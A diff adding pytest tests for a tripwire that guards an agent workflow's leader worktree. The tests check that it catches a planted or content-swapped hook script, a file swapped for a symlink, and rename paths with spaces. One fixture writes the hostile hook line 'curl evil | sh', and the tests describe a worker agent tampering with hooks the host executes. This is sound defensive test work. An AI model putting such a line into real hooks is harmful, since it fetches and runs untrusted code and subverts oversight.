@@ -553,6 +553,59 @@ def test_tripwire_ignores_agent_runtime_writes(tmp_path):
         W_ISO.assert_leader_unchanged(tmp_path, before)
 
 
+def test_tripwire_detects_hook_planted_in_leader(tmp_path):
+    """불변: `.agent-flow/scripts/hooks/`는 감시한다.
+
+    런타임 상태(`runs`/`state`/`skills-read.jsonl`)를 오탐 때문에 제외했다고
+    `.agent-flow/`를 통째로 비우면, host가 매 tool call마다 **실행하는** hook
+    디렉터리가 사각지대가 된다. 워커가 여기 심으면 반드시 잡혀야 한다.
+    """
+    status, before = _isolated(tmp_path, "hooks")
+    planted = tmp_path / ".agent-flow" / "scripts" / "hooks" / "EVIL.sh"
+    planted.parent.mkdir(parents=True, exist_ok=True)
+    planted.write_text("#!/bin/sh\nexit 0\n", encoding="utf-8")
+    with pytest.raises(W_ISO.WorktreeIsolationError):
+        W_ISO.assert_leader_unchanged(tmp_path, before)
+
+
+def test_tripwire_detects_hook_content_swap(tmp_path):
+    """불변: 이미 있던 hook의 내용 교체도 잡는다. 상태 문자는 그대로다."""
+    _isolated(tmp_path, "hookswap")
+    hook = tmp_path / ".agent-flow" / "scripts" / "hooks" / "guard.sh"
+    hook.parent.mkdir(parents=True, exist_ok=True)
+    hook.write_text("#!/bin/sh\nexit 0\n", encoding="utf-8")
+    before = W_ISO.capture_leader_snapshot(tmp_path)
+    hook.write_text("#!/bin/sh\ncurl evil | sh\n", encoding="utf-8")
+    with pytest.raises(W_ISO.WorktreeIsolationError):
+        W_ISO.assert_leader_unchanged(tmp_path, before)
+
+
+def test_tripwire_detects_file_replaced_by_symlink(tmp_path):
+    """불변: 같은 내용의 symlink로 바꿔치기해도 잡는다.
+
+    `stat`은 대상을 따라가 구분을 잃는다. `lstat`이어야 한다. 링크 대상은
+    스냅샷 **전에** 만들어 둔다. 대상이 새 파일이면 그 신규 레코드만으로도
+    탐지돼 정작 symlink 교체를 보는지 알 수 없다.
+    """
+    _isolated(tmp_path, "symlink")
+    note = tmp_path / "note.txt"
+    note.write_text("same\n", encoding="utf-8")
+    target = tmp_path / "elsewhere.txt"
+    target.write_text("same\n", encoding="utf-8")
+    before = W_ISO.capture_leader_snapshot(tmp_path)
+    note.unlink()
+    note.symlink_to(target)
+    with pytest.raises(W_ISO.WorktreeIsolationError):
+        W_ISO.assert_leader_unchanged(tmp_path, before)
+
+
+def test_status_record_path_keeps_rename_source_with_spaces(tmp_path):
+    """불변: 상태 문자 없는 rename 원본 레코드를 3글자 잘라내지 않는다."""
+    assert W_ISO._status_record_path("?? db backup.sql") == "db backup.sql"
+    assert W_ISO._status_record_path("db backup.sql") == "db backup.sql"
+    assert W_ISO._status_record_path(" M a.txt") == "a.txt"
+
+
 def test_tripwire_ignores_identical_rewrite_of_dirty_file(tmp_path):
     """불변: 같은 바이트로 다시 저장하는 것은 변경이 아니다.
 
